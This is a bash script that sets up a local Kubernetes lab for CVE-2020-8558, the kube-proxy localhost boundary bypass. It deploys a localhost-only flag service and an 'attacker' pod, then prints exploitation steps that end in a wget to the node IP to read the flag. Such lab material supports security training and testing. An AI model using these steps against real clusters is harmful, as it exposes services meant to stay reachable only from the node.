#!/bin/bash
set -euo pipefail
K8S_ID="k8s-24"
CLUSTER_NAME="cve-k8s-24-localhost-bypass"
source "$(dirname "$0")/../../scripts/k8s-common.sh"

echo "[K8S-24] CVE-2020-8558 kube-proxy Localhost Boundary Bypass"
k8s_init
k8s_create_host_flag
k8s_create_cluster
k8s_wait_ready

echo "[*] Pre-loading container images into KIND..."
k8s_load_images alpine:latest nginx:1.24-alpine

echo "[*] Setting up node-localhost service with flag..."
# Deploy a pod with hostNetwork that listens on 127.0.0.1:11080
# This simulates a sensitive service bound only to localhost on the node
k8s_apply << 'YAML'
apiVersion: v1
kind: Namespace
metadata:
  name: sensitive-ns
---
apiVersion: v1
kind: Pod
metadata:
  name: localhost-service
  namespace: sensitive-ns
spec:
  hostNetwork: true
  containers:
    - name: flag-server
      image: nginx:1.24-alpine
      imagePullPolicy: IfNotPresent
      command: ["sh", "-c"]
      args:
        - |
          # Serve flag only on 127.0.0.1:11080
          cat > /etc/nginx/conf.d/default.conf << 'NGINX'
          server {
            listen 127.0.0.1:11080;
            location /flag {
              return 200 'FLAG_CONTENT\n';
            }
          }
          NGINX
          nginx -g 'daemon off;'
      securityContext:
        privileged: false
---
apiVersion: v1
kind: Pod
metadata:
  name: attacker
  namespace: default
spec:
  containers:
    - name: attacker
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
YAML

echo "[*] Waiting for pods..."
k8s_wait_pod "localhost-service" "sensitive-ns"
k8s_wait_pod "attacker" "default"
sleep 5

# Get node IP for the attacker
NODE_IP=$(kubectl get node -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
k8s_info
echo "    Flag service: 127.0.0.1:11080 (node-localhost, not externally accessible)"
echo "    Node IP: $NODE_IP"
echo ""
echo "    Exploitation steps:"
echo "    1. From the attacker pod, discover the node IP:"
echo "       kubectl exec attacker -- cat /etc/hosts | grep host"
echo "       # or via DNS: nslookup kubernetes.default.svc.cluster.local"
echo "    2. kube-proxy sets route_localnet=1, allowing pods to reach node's localhost"
echo "    3. Access the localhost-bound service via the node IP:"
echo "       kubectl exec attacker -- wget -qO- http://${NODE_IP}:11080/flag"
echo "    4. Without route_localnet, 127.0.0.1:11080 would only be reachable from the node itself"
echo ""
echo "    Note: CVE-2020-8558: kube-proxy sets net.ipv4.conf.all.route_localnet=1"
echo "    which allows adjacent hosts/pods to reach TCP/UDP services bound to 127.0.0.1 on nodes."